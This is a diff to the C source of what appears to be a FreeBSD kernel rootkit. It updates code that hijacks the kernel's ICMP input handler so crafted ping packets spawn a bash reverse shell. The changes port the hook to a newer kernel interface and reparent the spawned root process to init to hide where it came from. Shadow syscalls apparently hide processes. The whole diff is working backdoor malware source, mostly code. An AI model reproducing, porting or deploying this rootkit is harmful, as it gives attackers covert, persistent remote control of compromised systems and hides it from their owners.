@@ -8,8 +8,8 @@
 #include <sys/sysproto.h>
 #include <sys/kthread.h>
 #include <sys/unistd.h>
-#include <sys/sysent.h>
 #include <sys/sched.h>
+#include <sys/sysent.h>
 #include <sys/types.h>
 #include <sys/malloc.h>
 #include <netinet/in.h>
@@ -17,12 +17,8 @@
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <netinet/ip_var.h>
-#include <sys/syscallsubr.h>
 #include <sys/imgact.h>
-#include <sys/queue.h>
-#include <sys/lock.h>
 #include <sys/sx.h>
-#include <sys/mutex.h>
 #include <vm/vm.h>
 #include <vm/pmap.h>
 #include <vm/vm_map.h>
@@ -72,7 +68,7 @@
 #define FULL_BASH_COMMAND_STR BASH_COMMAND_STR"255.255.255.255/65535 0>&1"
 #define ARG2LEN 48
 
-extern struct protosw inetsw[];
+extern ipproto_input_t *ip_protox[];
 
 char ** order_66_args = NULL;
 
@@ -93,7 +89,7 @@ static void start_order_66(void *data) {
    struct order_66_params * params = (struct order_66_params *)data;
    vm_offset_t addr;
    struct execve_args args;
-   int error;
+   int error = 0;
    size_t length;
    char *ucp, **uap, *arg0, *arg1, *arg2;
    struct thread *td;
@@ -188,7 +184,7 @@ static void create_order_66(void *data) {
    struct fork_req fr;
    struct ucred *newcred, *oldcred;
    struct thread *td;
-   int error;
+   int error = 0;
 
    bzero(&fr, sizeof(fr));
    fr.fr_flags = RFFDG | RFPROC | RFSTOPPED;
@@ -201,7 +197,7 @@ static void create_order_66(void *data) {
       return;
    }
 
-   /* divorce order_66's credentials from the kernel's */
+   // divorce order_66's credentials from the kernel's
    newcred = crget();
    sx_xlock(&proctree_lock);
    PROC_LOCK(params->stk_order_66_proc);
@@ -212,6 +208,8 @@ static void create_order_66(void *data) {
    crcowfree(td);
    td->td_realucred = crcowget(params->stk_order_66_proc->p_ucred);
    td->td_ucred = td->td_realucred;
+   // Change the parent process to init
+   proc_reparent(params->stk_order_66_proc, initproc, true);
    PROC_UNLOCK(params->stk_order_66_proc);
    sx_xunlock(&proctree_lock);
    crfree(oldcred);
@@ -221,6 +219,9 @@ static void create_order_66(void *data) {
 }
 
 static void kick_order_66(void *data) {
+#ifdef DEBUG
+   printf("[-] kick_order_66 called\n");
+#endif
    struct order_66_params * params = (struct order_66_params *)data;
    struct thread *td;
 
@@ -230,7 +231,7 @@ static void kick_order_66(void *data) {
    sched_add(td, SRQ_BORING);
 }
 
-static void order_66() {
+static void order_66(void) {
 #ifdef DEBUG
    printf("[-] order_66 thread created\n");
 #endif
@@ -260,8 +261,7 @@ static void order_66() {
    create_order_66(&params);
    kick_order_66(&params);
 
-   int status;
-   int error;
+   int error = 0;
    sy_call_t * deepbg = shadow_sysent[DEEPBG_INDEX].new_sy_call;
    sy_call_t * whisper = shadow_sysent[WHISPER_INDEX].new_sy_call;
    struct whisper_args wa;
@@ -296,16 +296,14 @@ static void order_66() {
       }
    }
 
-   // Wait for the process to exit before exiting the kernel thread
-   kern_wait(curthread, params.stk_order_66_proc->p_pid, &status, 0, NULL);
-
 #ifdef DEBUG
-   printf("[-] order_66 thread exiting\n");
+   printf("[-] order_66 kthread exiting\n");
 #endif
+
    kthread_exit();
 }
 
-pr_input_t icmp_input_order_66;
+ipproto_input_t icmp_input_order_66;
 /* icmp_input hook. */
 int icmp_input_order_66(struct mbuf **m, int *off, int proto) {
    struct icmp *icp;
@@ -446,7 +444,7 @@ static int load(struct module *module, int cmd, void *arg) {
 #endif
          sx_init(&stk_xfer_lock, "stk_xfer_lock");
          /* Replace icmp_input with icmp_input_order_66. */
-         inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_order_66;
+         ip_protox[IPPROTO_ICMP] = icmp_input_order_66;
          break;
       case MOD_UNLOAD:
 #ifdef DEBUG
@@ -454,7 +452,7 @@ static int load(struct module *module, int cmd, void *arg) {
 #endif
          sx_destroy(&stk_xfer_lock);
          /* Change everything back to normal. */
-         inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+         ip_protox[IPPROTO_ICMP] = icmp_input;
          break;
       default:
          error = EOPNOTSUPP;
